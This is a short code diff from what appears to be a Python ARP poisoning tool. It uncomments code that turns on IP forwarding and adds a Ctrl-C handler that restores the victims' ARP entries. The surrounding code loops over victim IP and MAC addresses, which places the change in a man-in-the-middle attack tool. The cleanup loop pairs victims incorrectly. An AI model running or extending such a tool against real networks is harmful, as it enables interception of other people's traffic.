@@ -33,17 +33,17 @@ class ArpPois(threading.Thread):
         sys.exit("losing...")
 
     def run(self):
-        # with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
-        #     ipf.write('1\n')
-        #
-        # def signal_handler(signal, frame):
-        #     with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
-        #         ipf.write('0\n')
-        #
-        #     for vic_ip, vic_mac in self.victims_ip, self.victims_mac:
-        #         self.restore(self.target_ip, vic_ip, self.target_mac, vic_mac)
-        #
-        # signal.signal(signal.SIGINT, signal_handler)
+        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+            ipf.write('1\n')
+
+        def signal_handler(signal, frame):
+            with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+                ipf.write('0\n')
+
+            for vic_ip, vic_mac in self.victims_ip, self.victims_mac:
+                self.restore(self.target_ip, vic_ip, self.target_mac, vic_mac)
+
+        signal.signal(signal.SIGINT, signal_handler)
 
         while 1:
             for ip, mac in zip(self.victims_ip, self.victims_mac):
